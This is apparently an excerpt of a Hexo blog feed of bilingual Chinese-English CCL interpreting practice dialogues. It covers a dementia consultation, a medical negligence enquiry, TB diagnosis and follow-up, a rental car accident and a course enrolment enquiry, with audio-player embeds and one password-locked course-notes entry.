医生，您好。我担心我的婆婆可能精神上出现了问题，她最近总是说胡话。</td><td>Hello, doctor. I am afraid my mother-in-law has got some mentalproblems. She keeps speaking non-sense recently. </td></tr><tr class="even"><td>E1</td><td> What are the symptoms? Does she often have some kind ofhallucinations or delusions? Or do you know if there are any unusualthoughts or ideas that seem to be with her?</td><td>有哪些症状呢？她是不是经常产生某种幻觉或错觉？或者，你知不知道她是否有任何异常想法和奇怪的念头?</td></tr><tr class="odd"><td>M2</td><td> 是的，她有。但还不止这些。最近，她已经尿床好几回了。她也坐不住，还经常搓拉皮肤。她看起来不安又焦虑，对了，她还有失眠。</td><td>Yes, there are. But that’s not all. Recently she has wet her bedseveral times. She can’t sit still and she has been rubbing and pullingher skin. She appears to be restless and anxious. Also she hasinsomnia. </td></tr><tr class="even"><td>E2</td><td>It seems to me that your mother-in-law has Dementia. It is the namefor a group of brain disorders that affect memory, behavior, learningand language. And Alzheimer's disease (AD) is the most common form ofsenile dementia.</td><td>看起来你的婆婆得了痴呆症。痴呆症是一系列大脑失调的统称，会影响到记忆力、行为能力、学习和语言能力。阿尔兹海默氏症是老年痴呆中最常见的。</td></tr><tr class="odd"><td>M3</td><td>老年痴呆？怎么可能呢？她才 50 多岁。而且就在一年前，她还是好好的,而且我婆婆身体到现在都很健康，从不生病，壮得像头牛。</td><td>Senile Dementia? How could this be possible? She is only in her50’s. And she was doing well just over a year ago. Plus my mother-in-lawis still physically fit. She never gets sick. She’s as tough asnails.</td></tr><tr class="even"><td>E3</td><td> Oh ok, she is suffering incontinence and anxiety. Those are signsof having dementia, including suddenly losing one’s faculties. Does shehave any problems taking showers, dressing, preparing meals or withother daily tasks? </td><td>喔，她现在大小便失禁，并且表现出焦虑。包括突然丧失自理能力/官能，都是痴呆症的症状表现。她在日常生活或活动中，有没有什么困难，比如自己洗澡、穿衣服、做饭等等？</td></tr><tr class="odd"><td>M4</td><td> 你说的这些，她都做不了。从前还是她替我们接送孩子上下学呢，可是现在连照顾好自己都有困难了。</td><td>She can’t do any of the things that you mentioned. She used to helpus send the kids to school and pick them up from school, but now she iseven having difficulties looking after herself. </td></tr><tr class="even"><td>E4</td><td>I’m afraid your mother-in-law has already reached the advancedstage, which is not uncommon among people who have reached their 50s.She will need to see a psychiatrist.</td><td>我恐怕你的婆婆已经到了晚期了。 这在年满 50 岁和 50岁以上的人群中，并非罕见。她必须去看精神科医生。</td></tr><tr class="odd"><td>M5</td><td> 我们带着她去看过许多老年病专家，可是都没什么结果。我跟我老公白天都上班，没人在家照顾她。现在我们知道她病了，我们该怎么办呢？</td><td>We have taken her to see many geriatricians without any results. Myhusband and I have to work during the day, so nobody looks after her athome. Now we know she is sick, what should we do? </td></tr><tr class="even"><td>E5</td><td> In that case, she will need to go into a nursing home. I am sureshe will be well looked after by the nurses and social workersthere.</td><td>这样的话，就需要送她去疗养院。我相信那里的护士和社工会给她很好的照顾。</td></tr><tr class="odd"><td>M6</td><td> 那有什么很好的治疗方法吗？我父亲对于中医非常有兴趣，他很相信中药比常规的那些药更有效。</td><td>Is there any effective treatment for this disease? My father is veryinterested in traditional Chinese Medicine, and he believes it is moreeffective than conventional medicine.</td></tr><tr class="even"><td>E6</td><td> Certainly there are some approaches and methods to deal with thissituation. However, as I said before, she is already in the late stagesof dementia, so it is really hard to guarantee the outcome.</td><td>当然是有一些治疗方法的。但是，正如我说的，她已经是痴呆晚期了。所以很难保证治疗的结果。</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>医疗事故</title>
    <link href="https://yumtaro.com/archives/eca8a11e.html/"/>
    <id>https://yumtaro.com/archives/eca8a11e.html/</id>
    <published>2020-08-08T05:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-KuZYMAgw" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-KuZYMAgw"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL医疗事故",              author: "SIIT",              url: "/assets/ccl/CCL医疗事故.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This dialogue is between Mrs Yang (Y) and a legal aid officer (o). ** *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>Good morning, my name is James Blue, a solicitor at this legal aidoffice. How can I help you?</td><td>早上好，我是 James Blue, 是这个法律援助办公室的当值律师。有什么能帮您?</td></tr><tr class="even"><td>M1</td><td>早上好。我是 Wen. 我想咨询一下法律程序方面的问题。</td><td>Good morning, my name is Wen. I would like to make some inquiriesabout a legal procedure. </td></tr><tr class="odd"><td>E2</td><td>Yes, what would you like to know? Is it regarding worker’s comp oris it a medical issue?</td><td>好的。你想知道些什么呢？是关于工伤赔偿的？还是医疗方面 的?</td></tr><tr class="even"><td>M2</td><td>事情是这样的。我一个月前在某家医院做了一个小手术，可是我上次例行复查的时候，居然发现我体内居然留有手术时器械的残片。这太吓人了！对于这起事故我非常生气，想对该医院采取一些法律手段。 </td><td>Here is the story. I had a small operation at a hospital one monthago. But last time I went for my regular check-up, I was found with abroken piece of a utensil left in my body. It was very shocking! I amvery upset over the incident and I am going to take legal action againstthe hospital. </td></tr><tr class="odd"><td>E3</td><td>There is a claim called medical negligence. It is normally wherepatients sue their doctors. Although your case is quite straightforward,winning is not guaranteed. That is the thing you have to be awareof.</td><td>这种案子被称为医疗事故。一般是指病人状告医生。虽然你的案子很直接，但也不能保证一定会赢。你需要明白这一点。</td></tr><tr class="even"><td>M3</td><td>也就是说，如果我输了官司，我就得支付双方的诉讼费用，这可会是一大笔钱啊，是这样吗？</td><td>In other words, if I lose, I may have to pay the legal costs of bothsides, which is quite a large amount of money, isn’t it?</td></tr><tr class="odd"><td>E4</td><td>Yes, you are right. But there are some solicitors in Sydney whohandle no- win-no-charge cases. I can give you a few names and telephonenumbers if you like.</td><td>是的，你说对了。但是悉尼一些律师是受理“不赢不收费”的案子的。如果你需要，我可以给你他们中一些人的名字和电话号码。</td></tr><tr class="even"><td>M4</td><td>要是我不想告他们呢？律师可以帮我在庭外要来赔偿吗？如果解决不了，我再上法庭解决。</td><td> What if I don’t really want to sue them? Can those solicitors helpme to handle the claim outside the court? If it is not settled, we thenpresent the case in the court. </td></tr><tr class="odd"><td>E5</td><td>Yes. You can discuss your preferences with the solicitor you havechosen. Regarding the procedures, I can only give the procedures most ofthe solicitors would follow, but it varies from person to person.</td><td>是的。你可以跟你所选择的律师讨论你的意向。关于司法程序，我只能跟你讲讲大多数律师会遵从的程序，但这是因人而异的。</td></tr><tr class="even"><td>M5</td><td>没关系。在法律方面，我是个外行。所以想请您跟我在详细地解释一下，并且让我很容易就能听明白。</td><td>That is ok. But I don’t know much about law. So could you pleaseexplain to me in detail and make it easy for me to understand? </td></tr><tr class="odd"><td>E6</td><td>First, your solicitor will write to the hospital informing them thathe or she is acting on your behalf. In the meantime you will need toobtain a written report "from the medical specialist to verify it is amedical negligence. // Secondly, your solicitor will inform you to goahead with all the necessary treatments and keep all the accounts.Thirdly, your solicitor will lodge a formal claim including the chargesto the hospital or their insurance company.</td><td>首先，你的律师会发一封书面通知给医院，告诉他们他/她现在代表你行事。同时，你需要从专科医生那里拿到一份报告，证明这是一起医疗事故。然后，你的律师会告诉你接受所有必要的治疗并保存好相关的账目资料。最后，你的律师会提交一份正式的索赔，包括他要向医院或者医院的保险公司收取的相关费用。</td></tr><tr class="even"><td>M6</td><td>如果他们同意照价赔偿，这个案子就结束了吧？要是他们拒绝了呢？</td><td>Will the case be finalised if they are willing to pay the agreedamount? What will happen if they refuse to pay? </td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>结核确诊</title>
    <link href="https://yumtaro.com/archives/89a44025.html/"/>
    <id>https://yumtaro.com/archives/89a44025.html/</id>
    <published>2020-08-08T03:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.048Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-BqhXYdij" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-BqhXYdij"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL结核确诊",              author: "SIIT",              url: "/assets/ccl/CCL结核确诊.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This is a dialogue between Mr. Zhang (Z) and a TB specialist (S) atthe clinic. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>So what symptoms do you have? How long have you been feelingunwell?</td><td>你有什么症状呢？你感觉不适有多长时间了?</td></tr><tr class="even"><td>M1</td><td>我从三周前就开始咳嗽，我一直都以为是慢性支气管炎，因为我以前得过。您能跟我说一下结核病的常见症状吗？这样我也好回答一些。</td><td>I have been coughing for more than three weeks. But I always thoughtit was just chronic bronchitis because I used to have this problem. Canyou tell me some common symptoms of TB so I can better answer yourquestion? </td></tr><tr class="odd"><td>E2</td><td>Sure. People with TB may have some or all of the following symptoms:a cough that lasts for more than three weeks; fevers; unexplained weightloss; night sweats; always feeling tired; loss of appetite;blood-stained sputum and pain and/or swelling in the affected area whenTB is outside the lungs.</td><td>好的。有结核的人通常会有以下一些或全部的症状：连续咳嗽超过三个星期，发烧，不明原因的体重下降，夜间盗汗，时常感到疲倦，胃口不好，痰中带血，如果是肺部以外的结核感染，受感染的部位还会有疼痛或肿胀，或又疼又肿。</td></tr><tr class="even"><td>M2</td><td>我想起来了。我是最近食欲不佳，经常觉得累，体重也有骤然的下降。可是我不是病了么？这些反应都应该属于正常。</td><td>That rings a bell. My appetite has been really poor recently, and Ioften feel tired. I have lost some weight in a very short period aswell. But aren’t they normal since I have been sick? </td></tr><tr class="odd"><td>E3</td><td>Some people with active TB disease may have only mild symptoms, justlike your case here.</td><td>有些结核病患者可能只有一些轻微的症状，跟你的情况一样。</td></tr><tr class="even"><td>M3</td><td>那结核是怎样传播的？我可不想传染给我的家人或是身边的朋友。</td><td>How is TB spread? I don’t want my family or my friends to beinfected. </td></tr><tr class="odd"><td>E4</td><td>TB is spread through the air when a person with TB coughs, sneezesor speaks, sending germs in to the air, and when other people breathe inthese germs they can become infected.</td><td>携带结核病菌的人在咳嗽、打喷嚏或讲话时会把病菌传播到空气中，病菌通过空气传播，别人吸入带有病菌的空气后就会受到感染。</td></tr><tr class="even"><td>M4</td><td>那些长时间跟我接触的人，岂不是很容易被传染吗？那我是不是要带一直带着口罩？是不是应该最好被隔离起来？</td><td>So it is easy for those people who spend a lot of time with me toget infected? Do I have to wear a mask all the time? Would it be bestfor me to be isolated?</td></tr><tr class="odd"><td>E5</td><td>I’d suggest they have a skin test as well. But it is not necessaryto keep you separated from others, because TB is not spread by householditems, such as crockery, drinking glasses, sheets, clothes ortelephones. But I am afraid you have to keep your mask on all thetime.</td><td> 我建议他们也应该做个皮肤测试。但也没必要把你隔离起来，因为结核病菌不会通过接触家用物品传染。如餐具，水杯，床单，衣服或是电话。但我恐怕你得一直都带着口罩了。</td></tr><tr class="even"><td>M5</td><td>那还好。我可不想被隔离起来，像个外星人一样生活。我大概会接受怎样的治疗呢？</td><td>That makes me feel better. I don’t want to be isolated, living likean alien. What kind of treatment will I be receiving?</td></tr><tr class="odd"><td>E6</td><td>Generally, TB disease is treated with a combination of specialantibiotics for at least six months. People with TB can be cured if theycomplete the treatment.</td><td>一般来说，结核病的治疗需要至少连续六个月服用特殊的抗生素药物组合。结核患者完成治疗后可以完全康复。</td></tr><tr class="even"><td>M6</td><td>谢谢您的耐心讲解。我现在感觉好多了。</td><td>Thank you for the explanation and for your patience. I am feelingmuch better now. </td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>结核复查</title>
    <link href="https://yumtaro.com/archives/c002482e.html/"/>
    <id>https://yumtaro.com/archives/c002482e.html/</id>
    <published>2020-08-08T02:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.048Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-lWenbiIY" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-lWenbiIY"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL结核复查",              author: "SIIT",              url: "/assets/ccl/CCL结核复查.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This is a dialogue between Mr. Zhang (Z) and a TB Specialist (S) atthe clinic. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td> Good morning, Mr Zhang. Thanks for coming today. Please let me havea look at your file first. So you have been diagnosed with TB, is thatcorrect?</td><td>张先生，早上好。谢谢你今天过来。先让我看一下你的资料。你被诊断出患有结核，是这样吗?</td></tr><tr class="even"><td>M1</td><td> 是的。我上个星期做了一个 X光胸片检查，医生发现了一些异常。但这之前，我定期的体检都没查出任何问题。</td><td> Yes. I had a chest X-ray last week, and the doctor found somethingabnormal. But before that, my regular health checks revealed noproblems. </td></tr><tr class="odd"><td>E2</td><td> First, you must know that TB infection and TB disease aredifferent. Maybe you have been infected since a long time ago, but theTB germs have just become active recently.</td><td>首先，你必须知道结核感染者和结核患者是不同的。也许你很久以前就已经被感染了，但是结核菌直到最近才发作。</td></tr><tr class="even"><td>M2</td><td> 对不起，我完全听不懂您说的。叫结核的这个东西到底是种什么病？</td><td>I am sorry, but I didn’t understand what you said. What on earth isthis so-called TB? </td></tr><tr class="odd"><td>E3</td><td> TB is short for tuberculosis. It is a disease caused by thebacteria, Mycobacterium tuberculosis. TB can damage a person’s lungs orother parts of the body and cause serious illness.</td><td>TB 是结核的简称。它是由于感染到一种叫结核病菌的细菌而引起的。结核会损伤人体的肺部或其他器官，从而引发严重的疾病。</td></tr><tr class="even"><td>M3</td><td> 也就是说这是一种传染病。那您刚才所说的，感染结核病毒和患结核病，分别又是指什么呢？</td><td>So it’s a contagious disease. Regarding the TB infection and TBdisease which you just mentioned, could you tell me what each of themare?</td></tr><tr class="odd"><td>E4</td><td> TB infection means the TB germs are in the body but they areinactive. In most cases, the body’s defences control the germs. However,these germs can stay alive in an inactive state. While the TB germs areinactive, they cannot do any damage or be spread to other people. Theperson is “infected.”</td><td>结核感染是指结核病毒已经进入人体但是出于潜伏状态。结核病毒进入人体后通常被人体的免疫系统所控制。但是这类病毒能够潜伏在人体中保持存活。在潜伏状态，结核病菌不会对人体造成伤害，也不会传染。携带者只是受到“感染”。</td></tr><tr class="even"><td>M4</td><td> 那如果在潜伏期，怎么确定自己是不是被感染了呢？那么感染后多久，就会发病呢？</td><td>During the period when the germs are inactive, how is the infectiondetected? And how long does it usually take for an infection to become adisease?</td></tr><tr class="odd"><td>E5</td><td> Infection can be detected by a positive result to a Tuberculin SkinTest. It is possible, even after many years, for inactive TB germs tobecome active when the body’s defences are weakened. This may be due toageing, serious illness, a stressful event, drug or alcohol misuse, anHIV infection or other conditions.</td><td>结核菌素皮肤测试如果呈阳性，就说明你被感染了。潜伏了许多年的结核病毒依然有可能活跃起来。由于年龄增加，罹患严重疾病，外界压力，滥用药品、酗酒，艾滋病毒感染或其他原因导致的人体抵抗力下降，就可能引起这种转变。</td></tr><tr class="even"><td>M5</td><td> 所以结核和肺结核基本是一回事，对么？我听说这个病还挺严重的呢，在中国古代，多少人都死于肺痨。</td><td>So TB and pulmonary tuberculosis are quite the same thing, am Iright? I was told that, this kind of disease is very serious. So manypeople died of pulmonary tuberculosis in ancient China. </td></tr><tr class="odd"><td>E6</td><td> Not really. Pulmonary tuberculosis is just one type of TB diseases,but this is the most common one. Actually, people who can be infectiousto others are only those with TB of the lungs or throat. TB is a curabledisease now. You don’t need to worry about that. </td><td>不完全对。肺结核只是结核病中一种，却是最常见的一种。其实，只有喉部和肺部有结核病菌的人才会对他人造成感染。结核病现在是一种可以治愈的疾病。你不必担心。</td></tr><tr class="even"><td>M6</td><td> 这我就放心了。您不知道，我最怕死了。哪怕是身体有点儿小毛病，我就非常担心。</td><td>That’s a big relief. Maybe you didn’t know, I am very afraid ofdeath. I become extremely worried whenever I have problems with myhealth, even small issues. </td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>unimelb 2020 s2</title>
    <link href="https://yumtaro.com/archives/5e5dab33.html/"/>
    <id>https://yumtaro.com/archives/5e5dab33.html/</id>
    <published>2020-08-03T17:12:35.000Z</published>
    <updated>2022-05-31T07:20:56.374Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6848ef910e6224782b1a5f2a6a137b2b4fe5132b669bac78cfa17d6c1768bf72"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">COMP90007, COMP90038, SWEN90006, SWEN90016</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="unimelb" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/"/>
    
    <category term="MIT" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/MIT/"/>
    
    
    <category term="unimelb" scheme="https://yumtaro.com/tags/unimelb/"/>
    
  </entry>
  
  <entry>
    <title>租车意外</title>
    <link href="https://yumtaro.com/archives/a374301.html/"/>
    <id>https://yumtaro.com/archives/a374301.html/</id>
    <published>2020-08-02T08:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-hYlMNKuU" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-hYlMNKuU"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "“CCL租车意外"",              author: "SIIT",              url: "/assets/ccl/CCL租车意外.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>Mr Xue (X) is reporting a car accident over the phone to a car rentalagency (A). * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>你好，请问是 ABC租车公司吗？我的名字叫薛安利。我和我妻子今天早上从你们公司租了一辆马自达。</td><td> Hello, is that ABC Rent-a-car company? My name is Anli Xue. My wifeand I rented a Mazda from your company this morning. </td></tr><tr class="even"><td>M1</td><td>Yes. Good afternoon, Mr Xue. May I have your booking referencenumber before I assist you with anything? </td><td>是的。下午好，薛先生。在我帮助您之前能否先告诉我们一下您的订单号码？</td></tr><tr class="odd"><td>E2</td><td>哎呀，来不及了。你先听我说，我们正开车去往 Blue Mountains， 但我们在Katoomba火车站附近出了交通事故。我不知道该怎么办，但我想我应该先通知你们一声。</td><td>Well, there is no time for that. Listen, we are driving to the BlueMountains, but we’ve had a car accident near the Katoomba railwaystation. I don’t know what to do, but I thought I should just inform youabout this accident first. </td></tr><tr class="even"><td>M2</td><td>Yes. You did the right thing. I think I am able to find the bookingdetails if I do a search by your family name. Yes, there it is. Is thereanyone else in the car? Are you all fine?</td><td>是的。您做的对。我想我可以通过搜索您的姓氏来找到您的预定信息。找到了。车上还有其他人吗？你们都还好吗?</td></tr><tr class="odd"><td>E3</td><td>我的头撞到了前玻璃窗，但不是很严重。所以我还好，可是我的妻子受伤很重。她说腹部有剧痛，而且她还有一条腿正在流血。</td><td>I hit my head against the windshield. But it wasn’t very serious. SoI am alright but my wife is seriously injured. She is now complaining ofa sharp pain in the stomach, and her leg is bleeding. </td></tr><tr class="even"><td>M3</td><td>Do you need us to call an ambulance and the police for you? Pleasetell us exactly where you are. You can find this information on yourGPS.</td><td>你需要我们帮您叫警察和救护车吗？请准确的告诉我们你的位置。 你可以从GPS 上找到这个信息。</td></tr><tr class="odd"><td>E4</td><td>是的，请你们马上就叫吧。我现在真的吓坏了。GPS 说我们现在的位置是Katoomba 区，Royal 路 5 号。</td><td> Yes, please do it right away. I am really freaked out right now.The GPS shows our current address is 5 Royal Road, Katoomba.</td></tr><tr class="even"><td>M4</td><td>Ok, got it. Please first calm down. One of my colleagues is nowcalling the ambulance and the police for you. They will reach there andhelp you out in a few minutes. Also do you need an interpretingservice? </td><td>好的，收到。请先冷静下来。我的一位同事正在帮你叫警察和救护车。他们应该几分钟后就能找到你们并把你们解救出来。你也同样需要口译服务吧？</td></tr><tr class="odd"><td>E5</td><td>是的，你想的真周到。请他们让一个口译员跟他们一起来吧。因为我们还是要跟救护人员和警察讲一下事情的经过。</td><td>Yes. You are very thoughtful. Please ask them to have an interpretercome with them, because we will have to explain to the paramedics andthe police about what happened. </td></tr><tr class="even"><td>M5</td><td>Sure. While we are waiting for help, could you tell me very brieflyhow it happened?</td><td>好的。在我们等救援的这期间，您能够简要的告诉我事故是怎样发生的?</td></tr><tr class="odd"><td>E6</td><td>我在左转的时候，撞上了护栏。也许是车速太快了，撞了以后就翻车了。</td><td> I run into the guardrail when I turned to the left. Maybe I wasdriving too fast, the car went upside down after the collision. </td></tr><tr class="even"><td>M6</td><td>I see. I think the ambulance will be there in a minute. Are you witha private health insurance fund? Because the ambulance service is notcovered by Medicare.</td><td>知道了。我想救护车应该马上就到了。你们有购买私人医疗保险吗？因为国民医疗保健 Medicare 是不报销救护车服务的。</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>课程咨询</title>
    <link href="https://yumtaro.com/archives/b93ec43f.html/"/>
    <id>https://yumtaro.com/archives/b93ec43f.html/</id>
    <published>2020-08-02T07:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.026Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-ZogLLUur" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-ZogLLUur"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL课程咨询",              author: "SIIT",              url: "/assets/ccl/CCL课程咨询.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This is a dialogue between Miss Jiang (J) and a course consultantregarding course enrolment (C). * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>Good afternoon, Miss Jiang. My name is Andrew Paris, a courseconsultant of DG TAFE. Nice to meet you.</td><td>下午好，蒋小姐。我是 Andrew Paris. 是 DG TAFE 学校的课程顾问。很高兴见到你。</td></tr><tr class="even"><td>M1</td><td>也很高兴见到你。有人告诉我要来这里咨询一下关于管理学文凭课程的情况，我找对地方了吗？</td><td>Nice to meet you, too. I was told to come here for advice about theManagement Diploma courses. Have I come to the right place?</td></tr><tr class="odd"><td>E2</td><td>Certainly you have. So have you read our diploma course prospectusyet? I believe the information on what is covered in this course can bevery useful to you. And there are different ways you can do thecourse.</td><td>你当然来对了。那么，你有没有看过我们文凭课程的详细说明？我相信关于课程内容的信息会对你很有帮助的。还有多种修读课程的方式可供你选择。</td></tr><tr class="even"><td>M2</td><td>其实，这正是我感到有点困惑的地方。你们有全日制精读课程，部分时间学习的课程，模块课程等等。我不知道我该选哪一种。 </td><td>Actually, this is where I’ve got a bit confused. There are full-timeintensive courses, part-time courses, and modular courses and so on. Idon’t know which one I should go with.</td></tr><tr class="odd"><td>E3</td><td>Well, let’s see if I can help. I think each course type has itsadvantages and disadvantages, so it really depends on you – your 